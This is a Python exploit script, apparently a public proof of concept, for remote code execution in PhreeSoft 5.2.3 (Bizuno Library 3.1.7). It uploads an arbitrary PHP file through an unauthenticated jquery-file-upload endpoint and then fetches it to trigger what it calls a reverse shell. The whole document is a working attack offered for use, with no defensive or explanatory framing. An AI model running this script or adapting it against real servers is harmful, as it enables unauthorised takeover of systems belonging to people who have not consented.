#!/usr/bin/python3

import requests
import argparse

parser = argparse.ArgumentParser(description='PhreeSoft 5.2.3 (Bizuno Library 3.1.7) - Remote Code Execution')

parser.add_argument('-t', '--target', help='Target IP address', required=True)
parser.add_argument('-p', '--payload', help='Payload in .php file', required=True)

host = parser.parse_args().target
filepath = parser.parse_args().payload
filename = filepath.split('/')[-1]

url = "http://" + host + "/books/apps/jquery-file-upload/server/php/index.php"
revshell = "http://" + host + "/books/apps/jquery-file-upload/server/php/files/" + filename

file = {
    'files': open(filepath, 'rb')
}

r = requests.get(revshell)

if r.status_code == 404:
    print("[+] Uploading file to website")
    print("[+] Sending reverse shell over")
    r = requests.post(url, files=file)

    if r.status_code == 200:
        print(f"[+] File uploaded at {revshell}") 
    
        r = requests.get(revshell)

        if r.status_code != 200:
            print("[-] Something went wrong, please manually check the file upload directory")

elif r.status_code != 200:
    print("[-] Something went wrong, please manually check the file upload directory")

